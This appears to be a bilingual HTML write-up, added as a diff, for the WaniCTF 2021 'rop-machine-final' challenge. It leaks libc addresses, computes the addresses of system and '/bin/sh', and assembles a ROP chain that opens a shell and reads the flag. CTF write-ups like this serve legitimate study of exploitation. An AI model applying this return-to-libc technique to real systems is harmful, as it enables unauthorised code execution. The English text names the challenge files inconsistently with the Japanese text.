@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>rop-machine-final (WaniCTF 2021) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>rop-machine-final</h1>
+<p class="language-selector-ja" lang="ja">
+TCPサーバの接続情報が与えられた。<br>
+また、ELFファイル <code>final</code> と、C言語のソースコード <code>final.c</code>、およびファイル <code>sample.py</code> が与えられた。<br>
+<code>final.c</code> は、以下の機能を持つものだった。
+</p>
+<p class="language-selector-en" lang="en">
+Information to connect to a TCP server was given.<br>
+Also, an ELF file <code>pwn01</code>, a C source code <code>pwn01.c</code>, and a file <code>sample.py</code> were given.<br>
+<code>final.c</code> had these operations:
+</p>
+<code-block data-extension="txt">
+[menu]
+0x01. append hex value
+0x02. append "pop rdi; ret" addr
+0x03. append "pop rsi; ret" addr
+0x04. append "pop rdx; ret" addr
+0x05. append "gets" addr
+0x06. append "open" addr
+0x07. append "read" addr
+0x08. append "write" addr
+0x0a. show menu (this one)
+0x0b. show rop_arena
+0x00. execute rop
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+まず、メニューにある関数群を <code>rop_arena</code> に入れ、<code>rop_arena</code> を出力させることで、これらの関数のアドレスを知ることができた。<br>
+例えば、以下のように出力された。
+</p>
+<p class="language-selector-en" lang="en">
+Firstly, we can know the addresses of the functions in the menu by appending them to <code>rop_arena</code> and then having it print <code>rop_arena</code>.<br>
+This is an example of output:
+</p>
+<code-block data-extension="txt">
+             rop_arena
++-----------------------------------+
+| 0x00007f70e17f6190 (gets        ) |&lt;- rop start
++-----------------------------------+
+| 0x00007f70e1885d10 (open        ) |
++-----------------------------------+
+| 0x00007f70e1886140 (read        ) |
++-----------------------------------+
+| 0x00007f70e1886210 (write       ) |
++-----------------------------------+
+</code-block>
+
+<span class="language-selector-ja" lang="ja">
+<p>
+これらの関数群の名前とアドレスを<common-tool data-lang="ja">libc-database</common-tool> に入れて FIND を押すと、
+<code>libc6_2.27-3ubuntu1.4_amd64</code> と <code>libc6_2.27-3ubuntu1.3_amd64</code> の2個の候補が表示された。<br>
+この2個の候補では、<code>gets</code> (<code>0x80190</code>)、<code>system</code> (<code>0x4f550</code>)、<code>str_bin_sh</code> (<code>0x1b3e1a</code>) の値は共通だった。
+</p><p>
+次に、一旦接続を切って接続しなおし、以下の操作を行う。
+</p>
+</span>
+<span class="language-selector-en" lang="en">
+<p>
+I put the names and addresses of the functions to <common-tool data-lang="en">libc-database</common-tool> and pressed FIND,
+seeing two candidates <code>libc6_2.27-3ubuntu1.4_amd64</code> and <code>libc6_2.27-3ubuntu1.3_amd64</code>.<br>
+The values of <code>gets</code> (<code>0x80190</code>), <code>system</code> (<code>0x4f550</code>), and <code>str_bin_sh</code> (<code>0x1b3e1a</code>) for the two candidates were the same.
+</p><p>
+Then, I performed these operations after disconnecting and reconnecting:
+</p>
+</span>
+<ol>
+<li>0x02. append "pop rdi; ret" addr</li>
+<li>0x05. append "gets" addr</li>
+<li>0x0b. show rop_arena</li>
+</ol>
+<p class="language-selector-ja" lang="ja">
+すると、今回の実行における関数 <code>gets</code> のメモリ上の位置がわかる。<br>
+さらに、この関数 <code>gets</code> のアドレスはpopの対象となるため、実行には影響を与えない。<br>
+例えば関数 <code>gets</code> のメモリ上の位置が <code>0x00007ff160d54190</code> のとき、<code>system</code> および <code>str_bin_sh</code> のメモリ上の位置は、
+Pythonのインタラクティブを用いて以下のように計算できる。
+</p>
+<p class="language-selector-en" lang="en">
+This reveal the address of the function <code>gets</code> in the memory used in this execution.<br>
+Also note that the address of the function <code>gets</code> will be popped and that it won't affect the execution.<br>
+Using this address, we can calculate the address of <code>system</code> and <code>str_bin_sh</code> in the memory using the interactive mode of Python.<br>
+Here is an example when <code>gets</code> is at <code>0x00007ff160d54190</code>:
+</p>
+<code-block data-extension="txt">
+Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; gets_mem = 0x00007ff160d54190
+&gt;&gt;&gt; system_mem = gets_mem + 0x4f550 - 0x80190
+&gt;&gt;&gt; hex(system_mem)
+'0x7ff160d23550'
+&gt;&gt;&gt; str_bin_sh_mem = gets_mem + 0x1b3e1a - 0x80190
+&gt;&gt;&gt; hex(str_bin_sh_mem)
+'0x7ff160e87e1a'
+</code-block>
+<span class="language-selector-ja" lang="ja">
+<p>
+続いて、<code>system("/bin/sh");</code> を実行するため、以下の順で <code>rop_arena</code> に追加する。
+</p>
+<ol>
+<li><code>pop rdi; ret</code> のアドレス </li>
+<li><code>str_bin_sh</code> のアドレス</li>
+<li><code>system</code> のアドレス</li>
+</ol>
+<p>
+最終的な <code>rop_arena</code> は、例えば以下のようになる。
+</p>
+</span>
+<span class="language-selector-en" lang="en">
+<p>
+After that, append things to <code>rop_arena</code> in these order to execute <code>system("/bin/sh");</code>:
+</p>
+<ol>
+<li>The address of <code>pop rdi; ret</code></li>
+<li>The address of <code>str_bin_sh</code></li>
+<li>The address of <code>system</code></li>
+</ol>
+<p>
+Finally, the <code>rop_arena</code> will be like this:
+</p>
+</span>
+<code-block data-extension="txt">
+             rop_arena
++-----------------------------------+
+| 0x000000000040138c (pop rdi; ret) |&lt;- rop start
++-----------------------------------+
+| 0x00007ff160d54190 (gets        ) |
++-----------------------------------+
+| 0x000000000040138c (pop rdi; ret) |
++-----------------------------------+
+| 0x00000000000000000007ff160e87e1a |
++-----------------------------------+
+| 0x00000000000000000007ff160d23550 |
++-----------------------------------+
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+この状態で execute rop を実行することで、シェルを起動できた。<br>
+<code>ls -al</code> コマンドを実行するとファイル <code>flag.txt</code> があることがわかり、<code>cat flag.txt</code> コマンドを実行するとflagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I succeeded to launch the shell by performing "execute rop" in this state.<br>
+Executing a command <code>ls -al</code> revealed that there is a file <code>flag.txt</code>, and I obtained the flag by executing a command <code>cat flag.txt</code>.
+</p>
+
+<div class="flag">FLAG{you-might-be-the-real-rop-master}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">WaniCTF 2021</a>
+</p>
+</body>
+</html>
